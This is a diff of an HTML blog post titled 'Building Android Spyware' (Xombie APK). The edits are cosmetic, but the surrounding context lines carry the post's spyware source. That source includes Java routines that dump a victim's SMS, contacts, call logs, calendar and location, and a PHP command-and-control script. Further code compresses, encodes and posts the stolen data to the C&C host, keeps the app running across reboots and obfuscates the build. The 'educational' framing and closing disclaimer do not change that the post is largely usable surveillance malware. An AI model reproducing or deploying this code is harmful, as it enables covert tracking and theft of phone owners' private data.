@@ -10,7 +10,7 @@
 
     <!-- Begin Jekyll SEO tag v2.6.1 -->
 <title>Building Android Spyware | Arti Karahoda</title>
-<meta name="generator" content="Jekyll v3.8.6" />
+<meta name="generator" content="Jekyll v3.9.0" />
 <meta property="og:title" content="Building Android Spyware" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices." />
@@ -361,14 +361,14 @@ img {
 <p>To start off with, I tried keeping the spyware code in a portable fashion so it can be easily integrated with other projects. We begin by modifying the Android Manifest file to ensure app’s functionality.</p>
 
 <h2 id="21-manifest">2.1. Manifest</h2>
-<p>Since Android 9 Pie (API level 28), cleartext traffic (unencrypted HTTP) will be blocked by default. Considering that most of the C&amp;C servers do not use a SSL/TLS certificate, we have to add a network security configuration file in <code class="highlighter-rouge">res/xml</code> to allow such traffic:</p>
+<p>Since Android 9 Pie (API level 28), cleartext traffic (unencrypted HTTP) will be blocked by default. Considering that most of the C&amp;C servers do not use a SSL/TLS certificate, we have to add a network security configuration file in <code class="language-plaintext highlighter-rouge">res/xml</code> to allow such traffic:</p>
 
 <figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
 <span class="nt">&lt;network-security-config&gt;</span>
     <span class="nt">&lt;base-config</span> <span class="na">cleartextTrafficPermitted=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;/network-security-config&gt;</span></code></pre></figure>
 
-<p>This resource can be referenced in <code class="highlighter-rouge">AndroidManifest.xml</code> by appending the <code class="highlighter-rouge">android:networkSecurityConfig="@xml/network_security_config</code> attribute in the <code class="highlighter-rouge">&lt;application&gt;</code> element. Furthermore, the configuration uses a <code class="highlighter-rouge">&lt;base-config&gt;</code> tag, meaning that any non-SSL domain/subdomain will work.</p>
+<p>This resource can be referenced in <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> by appending the <code class="language-plaintext highlighter-rouge">android:networkSecurityConfig="@xml/network_security_config</code> attribute in the <code class="language-plaintext highlighter-rouge">&lt;application&gt;</code> element. Furthermore, the configuration uses a <code class="language-plaintext highlighter-rouge">&lt;base-config&gt;</code> tag, meaning that any non-SSL domain/subdomain will work.</p>
 
 <h3 id="211-permissions">2.1.1. Permissions</h3>
 <p>We need to set up a couple of permissions to allow performing operations on the device operating system such as read SMS messages, contacts, calls, calendars, access geolocation using WiFi or GSM, and receive system boot signals:</p>
@@ -409,7 +409,7 @@ img {
 <h2 id="22-capabilities">2.2. Capabilities</h2>
 <p>Each capability has its own private method of returning an arraylist of gathered data. Furthermore, each function will have an extra check on permissions to begin with, since the end-user can revoke a specific permission at any given time; consequently, we avoid app crashes.</p>
 <h3 id="221-sms-dump">2.2.1. SMS Dump</h3>
-<p>If the device receives the <code class="highlighter-rouge">smsDump</code> task, and if granted the <code class="highlighter-rouge">READ_SMS</code> permission, it will initially query the local <code class="highlighter-rouge">content://sms/</code> storage. A <code class="highlighter-rouge">cursor</code> will iterate through the list of SMS messages and we will populate an array list with a couple of message attributes (their unique ID, sender phone number, date sent, and message body):</p>
+<p>If the device receives the <code class="language-plaintext highlighter-rouge">smsDump</code> task, and if granted the <code class="language-plaintext highlighter-rouge">READ_SMS</code> permission, it will initially query the local <code class="language-plaintext highlighter-rouge">content://sms/</code> storage. A <code class="language-plaintext highlighter-rouge">cursor</code> will iterate through the list of SMS messages and we will populate an array list with a couple of message attributes (their unique ID, sender phone number, date sent, and message body):</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchInbox</span><span class="o">()</span> <span class="o">{</span>
     <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">sms</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
@@ -438,7 +438,7 @@ img {
 <span class="o">}</span></code></pre></figure>
 
 <h3 id="222-contact-list-dump">2.2.2. Contact List Dump</h3>
-<p>On the other hand, if the device receives the <code class="highlighter-rouge">contactsDump</code> task (assuming the <code class="highlighter-rouge">READ_CONTACTS</code> permission is granted), we will use the <code class="highlighter-rouge">ContactsContract</code> database of contact-related information. The result should return all rows which have a valid registered phone number, along their unique ID and name of the associated person:</p>
+<p>On the other hand, if the device receives the <code class="language-plaintext highlighter-rouge">contactsDump</code> task (assuming the <code class="language-plaintext highlighter-rouge">READ_CONTACTS</code> permission is granted), we will use the <code class="language-plaintext highlighter-rouge">ContactsContract</code> database of contact-related information. The result should return all rows which have a valid registered phone number, along their unique ID and name of the associated person:</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchContacts</span><span class="o">()</span> <span class="o">{</span>
     <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
@@ -474,7 +474,7 @@ img {
 <span class="o">}</span></code></pre></figure>
 
 <h3 id="223-call-logs-dump">2.2.3. Call Logs Dump</h3>
-<p>Retrieving call log information requires the <code class="highlighter-rouge">READ_CALL_LOG</code> Manifest permission. Based on the placed call category, we send back the associated phone number along the date and time as well as call duration in seconds (if answered):</p>
+<p>Retrieving call log information requires the <code class="language-plaintext highlighter-rouge">READ_CALL_LOG</code> Manifest permission. Based on the placed call category, we send back the associated phone number along the date and time as well as call duration in seconds (if answered):</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchCallLogs</span><span class="o">()</span> <span class="o">{</span>
     <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">logs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
@@ -513,7 +513,7 @@ img {
 <span class="o">}</span></code></pre></figure>
 
 <h3 id="224-geographical-location-fetch">2.2.4. Geographical Location Fetch</h3>
-<p>Physical location (latitude and longitude) with the <code class="highlighter-rouge">getGeoLocation</code> tag can be either found using the WiFi network, or actual last stored location from the GPS itself. If there is no cached location values, it will force update the current position:</p>
+<p>Physical location (latitude and longitude) with the <code class="language-plaintext highlighter-rouge">getGeoLocation</code> tag can be either found using the WiFi network, or actual last stored location from the GPS itself. If there is no cached location values, it will force update the current position:</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">geoLocation</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
 <span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getGeoLocation</span><span class="o">()</span> <span class="o">{</span>
@@ -602,7 +602,7 @@ img {
 <span class="o">}</span></code></pre></figure>
 
 <h3 id="227-calendar-entries-dump">2.2.7. Calendar Entries Dump</h3>
-<p>This capability requires the <code class="highlighter-rouge">READ_CALENDAR</code> permission and returns a list of calendars available on the phone:</p>
+<p>This capability requires the <code class="language-plaintext highlighter-rouge">READ_CALENDAR</code> permission and returns a list of calendars available on the phone:</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchCalendar</span><span class="o">()</span> <span class="o">{</span>
     <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">calendar</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
@@ -635,7 +635,7 @@ img {
 <span class="o">}</span></code></pre></figure>
 
 <h3 id="228-service-termination">2.2.8. Service Termination</h3>
-<p>In case you want to remotely terminate the background service, you may use <code class="highlighter-rouge">kill</code> keyword as a kill switch:</p>
+<p>In case you want to remotely terminate the background service, you may use <code class="language-plaintext highlighter-rouge">kill</code> keyword as a kill switch:</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">AlarmManager</span> <span class="n">alarmManager</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AlarmManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="nc">Context</span><span class="o">.</span><span class="na">ALARM_SERVICE</span><span class="o">);</span>
 <span class="nc">Intent</span> <span class="n">invokeService</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="nc">Fetcher</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
@@ -650,7 +650,7 @@ img {
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"GET"</span><span class="p">)</span> <span class="p">{</span>
-	<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]))</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]))</span> <span class="p">{</span>
 		<span class="nv">$id</span> <span class="o">=</span> <span class="nx">sanitize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]);</span>
 		<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[0-9a-f]</span><span class="si">{</span><span class="nv">8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12</span><span class="si">}</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$id</span><span class="p">))</span> <span class="p">{</span>
 			<span class="c1">// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump</span>
@@ -675,7 +675,7 @@ img {
 	<span class="nv">$task</span> <span class="o">=</span> <span class="nx">sanitize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'task'</span><span class="p">]);</span>
 	<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">];</span>
 
-	<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$task</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="o">||</span> <span class="nb">empty</span><span class="p">(</span><span class="nv">$task</span><span class="p">)</span> <span class="o">||</span> <span class="nb">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
 		<span class="k">die</span><span class="p">(</span><span class="s2">"Parameters cannot be empty"</span><span class="p">);</span>
 	<span class="p">}</span>
 
@@ -695,7 +695,7 @@ img {
 <span class="p">}</span>
 <span class="cp">?&gt;</span></code></pre></figure>
 
-<p>To minimize manual code modifications in Android Studio, I have put the declaration of the C&amp;C server at the <code class="highlighter-rouge">res/values/strings.xml</code> file:</p>
+<p>To minimize manual code modifications in Android Studio, I have put the declaration of the C&amp;C server at the <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code> file:</p>
 
 <figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;resources&gt;</span>
     <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"app_name"</span><span class="nt">&gt;</span>Xombie<span class="nt">&lt;/string&gt;</span>
@@ -704,7 +704,7 @@ img {
 <span class="nt">&lt;/resources&gt;</span></code></pre></figure>
 
 <h3 id="231-intercommunication">2.3.1. Intercommunication</h3>
-<p>Initially, a device GUID is generated to uniquely identify a “zombie”. This ID is later used as a query parameter in its regular GET requests to the PHP end-point which returns JSON encoded data, hence, we will use the <code class="highlighter-rouge">JsonObject()</code> along <code class="highlighter-rouge">HttpURLConnection</code> to interact with the API. The response is handled by the <code class="highlighter-rouge">onPostExecute()</code> function if the connection was successful and there is a network connectivity as per the <code class="highlighter-rouge">isConnected()</code> boolean method.</p>
+<p>Initially, a device GUID is generated to uniquely identify a “zombie”. This ID is later used as a query parameter in its regular GET requests to the PHP end-point which returns JSON encoded data, hence, we will use the <code class="language-plaintext highlighter-rouge">JsonObject()</code> along <code class="language-plaintext highlighter-rouge">HttpURLConnection</code> to interact with the API. The response is handled by the <code class="language-plaintext highlighter-rouge">onPostExecute()</code> function if the connection was successful and there is a network connectivity as per the <code class="language-plaintext highlighter-rouge">isConnected()</code> boolean method.</p>
 
 <p>To send the payloads, I used the <a href="https://developer.android.com/training/volley" target="_blank">Volley HTTP library</a> which makes networking in Android apps easier. After an array list is returned from methods denoted in the capabilities section, the app will gzip compress payload data, as well as base64 and URL encode it to avoid making parsing a hassle:</p>
 
@@ -760,16 +760,16 @@ img {
 <span class="o">}</span></code></pre></figure>
 
 <h3 id="232-proof-of-concept">2.3.2. Proof of Concept</h3>
-<p>To test the app’s functionality without having to restart the phone, I have added a button on the <code class="highlighter-rouge">MainActivity</code> which invokes the <code class="highlighter-rouge">Fetcher</code> service, or in other words, makes a simple HTTP request as shown below:</p>
+<p>To test the app’s functionality without having to restart the phone, I have added a button on the <code class="language-plaintext highlighter-rouge">MainActivity</code> which invokes the <code class="language-plaintext highlighter-rouge">Fetcher</code> service, or in other words, makes a simple HTTP request as shown below:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cc.php?id=6f02ea91-746a-43b2-a646-f50338cd6b2a HTTP/1.1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cc.php?id=6f02ea91-746a-43b2-a646-f50338cd6b2a HTTP/1.1
 User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011)
 Host: 192.168.0.14
 Connection: Keep-Alive
 Accept-Encoding: gzip
 </code></pre></div></div>
 <p>The server responds as follows:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Date: Thu, 14 Nov 2019 00:15:31 GMT
 Server: Apache/2.4.35 (Win32) OpenSSL/1.1.0i PHP/7.2.11
 ETag: "48-59740498aca14"
@@ -785,7 +785,7 @@ Content-Type: application/json
 }
 </code></pre></div></div>
 
-<p>Upon receiving the <code class="highlighter-rouge">smsDump</code> command, <code class="highlighter-rouge">Fetcher</code> validates the <code class="highlighter-rouge">SMS_READ</code> permission and uses <code class="highlighter-rouge">sendData()</code> to trasmit the complete SMS logs to the PHP script as seen partially in below:</p>
+<p>Upon receiving the <code class="language-plaintext highlighter-rouge">smsDump</code> command, <code class="language-plaintext highlighter-rouge">Fetcher</code> validates the <code class="language-plaintext highlighter-rouge">SMS_READ</code> permission and uses <code class="language-plaintext highlighter-rouge">sendData()</code> to trasmit the complete SMS logs to the PHP script as seen partially in below:</p>
 
 <p><img src="/assets/images/xombie1.PNG" /></p>
 
@@ -804,10 +804,10 @@ Content-Type: application/json
     <span class="na">android:process=</span><span class="s">":System"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;/service&gt;</span></code></pre></figure>
 
-<p>This service is started from a system standpoint when another module invokes it by calling <code class="highlighter-rouge">startService()</code>. Once started, a service can run in the background indefinitely, even if the component that started it is destroyed. Usually, a started service performs a single operation and does not return a result to the caller. In our specific case, <code class="highlighter-rouge">Fetcher</code> is bound to a loop of operations until its <code class="highlighter-rouge">AlarmManager</code> is terminated.</p>
+<p>This service is started from a system standpoint when another module invokes it by calling <code class="language-plaintext highlighter-rouge">startService()</code>. Once started, a service can run in the background indefinitely, even if the component that started it is destroyed. Usually, a started service performs a single operation and does not return a result to the caller. In our specific case, <code class="language-plaintext highlighter-rouge">Fetcher</code> is bound to a loop of operations until its <code class="language-plaintext highlighter-rouge">AlarmManager</code> is terminated.</p>
 
 <h2 id="32-persistence">3.2. Persistence</h2>
-<p>When the application gets installed and opened, it will register a receiver which will be invoked during Android boot time <code class="highlighter-rouge">RECEIVE_BOOT_COMPLETED</code> (after system services get fully loaded that is). The main function of this <code class="highlighter-rouge">BroadcastReceiver</code> is to schedule an <code class="highlighter-rouge">AlarmManager</code> to start the Fetcher service periodically, thus, making it persistent in the device:</p>
+<p>When the application gets installed and opened, it will register a receiver which will be invoked during Android boot time <code class="language-plaintext highlighter-rouge">RECEIVE_BOOT_COMPLETED</code> (after system services get fully loaded that is). The main function of this <code class="language-plaintext highlighter-rouge">BroadcastReceiver</code> is to schedule an <code class="language-plaintext highlighter-rouge">AlarmManager</code> to start the Fetcher service periodically, thus, making it persistent in the device:</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Autostart</span> <span class="kd">extends</span> <span class="nc">BroadcastReceiver</span>
 <span class="o">{</span>
@@ -826,12 +826,12 @@ Content-Type: application/json
     <span class="o">}</span>
 <span class="o">}</span></code></pre></figure>
 
-<p><code class="highlighter-rouge">R.string.milliseconds</code> is referenced from <code class="highlighter-rouge">res/values/strings.xml</code> which defines the frequency of device requests from a time standpoint. As of Android 5.1, the minimum value is 60 seconds (60000 milliseconds). Consequently, a “zombie” will send a check-up HTTP request every minute until it receives a task/command.</p>
+<p><code class="language-plaintext highlighter-rouge">R.string.milliseconds</code> is referenced from <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code> which defines the frequency of device requests from a time standpoint. As of Android 5.1, the minimum value is 60 seconds (60000 milliseconds). Consequently, a “zombie” will send a check-up HTTP request every minute until it receives a task/command.</p>
 
-<p>However, please note that since Android 8 Oreo (API level 26) and above, there is a limitiation with respect to running background services due to malware apps abusing this function; the <code class="highlighter-rouge">startService()</code> method now throws an <code class="highlighter-rouge">IllegalStateException</code>. Apps are permitted to start background processes only under <a href="https://developer.android.com/about/versions/oreo/background.html" target="_blank">specific circumstances</a> when placed on temporary whitelists for handling tasks visible to the user, such as receiving a broadcast (SMS/MMS meesages).</p>
+<p>However, please note that since Android 8 Oreo (API level 26) and above, there is a limitiation with respect to running background services due to malware apps abusing this function; the <code class="language-plaintext highlighter-rouge">startService()</code> method now throws an <code class="language-plaintext highlighter-rouge">IllegalStateException</code>. Apps are permitted to start background processes only under <a href="https://developer.android.com/about/versions/oreo/background.html" target="_blank">specific circumstances</a> when placed on temporary whitelists for handling tasks visible to the user, such as receiving a broadcast (SMS/MMS meesages).</p>
 
 <h2 id="33-obfuscation">3.3. Obfuscation</h2>
-<p>If you use Android Studio 3.4 or Android Gradle plugin 3.4.0 and higher, then R8 is the default compiler that converts your project’s Java bytecode into the DEX format that runs on the Android platform. However, when you create a new project using Android Studio, obfuscation is not enabled by default due to the increased build time during code compilation. To enable shortening the name of classes and members (results in reduced DEX file sizes), the following should be added to the <code class="highlighter-rouge">build.gradle</code> file:</p>
+<p>If you use Android Studio 3.4 or Android Gradle plugin 3.4.0 and higher, then R8 is the default compiler that converts your project’s Java bytecode into the DEX format that runs on the Android platform. However, when you create a new project using Android Studio, obfuscation is not enabled by default due to the increased build time during code compilation. To enable shortening the name of classes and members (results in reduced DEX file sizes), the following should be added to the <code class="language-plaintext highlighter-rouge">build.gradle</code> file:</p>
 
 <figure class="highlight"><pre><code class="language-gradle" data-lang="gradle"><span class="n">buildTypes</span> <span class="o">{</span>
     <span class="n">release</span> <span class="o">{</span>
@@ -859,7 +859,7 @@ Content-Type: application/json
 <p><img src="/assets/images/xombie4.svg" alt="Figure 2 - Xombie Platform Use Case" /></p>
 
 <p><br />
-The controller device sends a command through an SMS message to retrieve all of the mobile phones geographical location (<code class="highlighter-rouge">getGeoLocation</code> keyword). The <a href="https://www.amazon.com/Walmeck-SIM900-Development-Raspberry-Android/dp/B07KS7ZNYD" target="_blank">GSM shield</a>, which can operate in Quad 850/900/1800/1900 MHz frequency bands, uses a local SIM card to receive the message, forward the SMS content to the <code class="highlighter-rouge">smsXlib</code> library, which then queues the task to the hosting server. Considering the mobile devices sends HTTP requests periodically to check whether there is something to do, in this case, they would immediately send relevant latitude and longitude values as a POST request (given that the user has given the application location service permission).</p>
+The controller device sends a command through an SMS message to retrieve all of the mobile phones geographical location (<code class="language-plaintext highlighter-rouge">getGeoLocation</code> keyword). The <a href="https://www.amazon.com/Walmeck-SIM900-Development-Raspberry-Android/dp/B07KS7ZNYD" target="_blank">GSM shield</a>, which can operate in Quad 850/900/1800/1900 MHz frequency bands, uses a local SIM card to receive the message, forward the SMS content to the <code class="language-plaintext highlighter-rouge">smsXlib</code> library, which then queues the task to the hosting server. Considering the mobile devices sends HTTP requests periodically to check whether there is something to do, in this case, they would immediately send relevant latitude and longitude values as a POST request (given that the user has given the application location service permission).</p>
 
 <h1 id="5-disclaimer">5. Disclaimer</h1>
 <p><i><b>Disclaimer:</b> Usage of this application for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. I assume no liability and I am not responsible for any misuse or damage caused.</i></p>
